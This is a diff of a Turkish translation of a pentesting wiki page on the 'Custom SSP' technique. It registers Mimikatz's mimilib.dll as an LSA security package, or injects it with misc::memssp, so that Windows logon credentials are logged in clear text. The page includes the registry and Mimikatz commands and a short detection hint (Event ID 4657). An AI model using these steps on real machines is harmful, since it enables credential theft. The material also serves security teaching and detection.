@@ -4,37 +4,37 @@
 
 ### Custom SSP
 
-[SSP (Güvenlik Destek Sağlayıcısı) nedir burada öğrenin.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
-Kendi **SSP'nizi** oluşturabilirsiniz, böylece makineye erişim için kullanılan **kimlik bilgilerini** **düz metin** olarak **yakalayabilirsiniz**.
+[SSP'nin (Security Support Provider) ne olduğunu buradan öğrenin.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
+Makineye erişmek için kullanılan **credentials** bilgilerini **clear text** olarak **capture** etmek üzere **kendi SSP'nizi** oluşturabilirsiniz.
 
 #### Mimilib
 
-Mimikatz tarafından sağlanan `mimilib.dll` ikili dosyasını kullanabilirsiniz. **Bu, tüm kimlik bilgilerini düz metin olarak bir dosyaya kaydedecektir.**\
-Dll'yi `C:\Windows\System32\` dizinine bırakın.\
-Mevcut LSA Güvenlik Paketlerinin bir listesini alın:
+Mimikatz tarafından sağlanan `mimilib.dll` binary dosyasını kullanabilirsiniz. **Bu, tüm credentials bilgilerini clear text olarak bir dosyaya kaydeder.**\
+DLL'yi `C:\Windows\System32\` konumuna bırakın.\
+Mevcut LSA Security Packages listesini alın:
 ```bash:attacker@target
 PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
 
 HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
-`mimilib.dll`'yi Güvenlik Destek Sağlayıcı listesine (Güvenlik Paketleri) ekleyin:
+`mimilib.dll` dosyasını Security Support Provider listesine (Security Packages) ekleyin:
 ```bash
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
-Ve bir yeniden başlatmadan sonra tüm kimlik bilgileri `C:\Windows\System32\kiwissp.log` dosyasında düz metin olarak bulunabilir.
+Ve yeniden başlatmanın ardından tüm kimlik bilgileri `C:\Windows\System32\kiwissp.log` içinde açık metin olarak bulunabilir.
 
 #### Bellekte
 
-Bunu doğrudan belleğe Mimikatz kullanarak da enjekte edebilirsiniz (biraz kararsız/çalışmayabileceğini unutmayın):
+Bunu Mimikatz kullanarak doğrudan belleğe de enjekte edebilirsiniz (biraz kararsız olabileceğini/çalışmayabileceğini unutmayın):
 ```bash
 privilege::debug
 misc::memssp
 ```
-Bu yeniden başlatmalara dayanmaz.
+Bu, yeniden başlatmalardan sonra kalıcı olmaz.
 
-#### Hafifletme
+#### Önlem
 
-Olay ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` oluşturma/değiştirme denetimi
+Event ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` oluşturulmasını/değiştirilmesini denetle
 
 {{#include ../../banners/hacktricks-training.md}}
